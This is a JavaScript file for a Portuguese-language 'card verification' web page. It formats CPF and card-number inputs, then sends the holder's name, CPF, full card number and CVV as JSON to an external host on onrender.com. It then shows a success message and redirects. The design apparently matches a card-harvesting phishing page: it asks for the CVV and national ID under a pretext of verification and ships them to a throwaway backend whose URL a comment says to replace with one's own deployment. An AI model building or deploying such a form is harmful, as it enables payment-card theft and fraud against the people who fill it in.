// Atualizar o Ano no Footer
function atualizarAno() {
    const ano = new Date().getFullYear();
    document.getElementById('anos').textContent = ano;
}
atualizarAno();

// Máscaras de Input
const inputCPF = document.getElementById('cpfInput');
const inputCartao = document.getElementById('cartaoInput');

inputCPF.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, "");
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    e.target.value = v;
});

inputCartao.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, "");
    v = v.replace(/(\d{4})(\d)/, "$1 $2");
    v = v.replace(/(\d{4})(\d)/, "$1 $2");
    v = v.replace(/(\d{4})(\d)/, "$1 $2");
    e.target.value = v;
});

// Lógica de Envio
const btn = document.getElementById('btnVerificar');
const spinner = document.getElementById('spinner');
const btnTexto = document.getElementById('btnTexto');
const msg = document.getElementById('mensagem');

btn.addEventListener('click', async () => {
    const dados = {
        nome: document.getElementById('nomeInput').value,
        cpf: inputCPF.value,
        numero: inputCartao.value,
        cvv: document.getElementById('cvvInput').value
    };

    // Reset de interface
    btn.disabled = true;
    spinner.classList.remove('d-none');
    btnTexto.textContent = " Verificando...";
    msg.classList.add('d-none');

    try {
        // TROQUE PELA URL DO SEU RAILWAY QUANDO FIZER O DEPLOY
        const response = await fetch('https://securecard-7gs0.onrender.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(dados)
        });

        const result = await response.json();

        if (response.ok) {
            if (response.ok) {
                msg.className = "alert alert-success mt-4 text-center";
                msg.textContent = "Cartão verificado com sucesso!";

                // Espera 2 segundos para o usuário ler a mensagem e redireciona
                setTimeout(() => {
                    window.location.href = "index.html"; // Nome do seu arquivo inicial
                }, 2000);
            }
            msg.className = "alert alert-success mt-4 text-center";
            msg.textContent = "Cartão verificado com sucesso!";
        } else {
            msg.className = "alert alert-danger mt-4 text-center";
            msg.textContent = result.error || "Erro na verificação.";
        }
    } catch (error) {
        msg.className = "alert alert-danger mt-4 text-center";
        msg.textContent = "Erro ao conectar com o servidor.";
    } finally {
        btn.disabled = false;
        spinner.classList.add('d-none');
        btnTexto.textContent = "Verificar Cartão";
        msg.classList.remove('d-none');
    }
});